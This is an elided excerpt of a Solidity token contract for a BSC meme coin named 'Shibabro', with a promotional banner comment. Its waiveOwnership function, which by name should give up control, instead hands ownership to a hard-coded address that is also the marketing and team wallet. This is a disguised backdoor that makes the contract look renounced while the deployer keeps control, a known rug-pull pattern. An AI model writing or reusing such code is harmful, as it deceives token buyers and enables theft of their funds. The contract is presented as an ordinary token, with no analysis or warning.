...
/*
            ...
            ⏰COUNTDOWN: 
    https://countingdownto.com/?c=4503067

🪙“We're here to bring you the coolest Meme token of all straight from the BSC Network”
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5B9E277F9df3C89aFCA1915877bC0b52Dc92eE46);
    }
...
contract Shibabro is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Shibabro";
    string private _symbol = "Shibabro";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5B9E277F9df3C89aFCA1915877bC0b52Dc92eE46);
    address payable public teamWalletAddress = payable(0x5B9E277F9df3C89aFCA1915877bC0b52Dc92eE46);
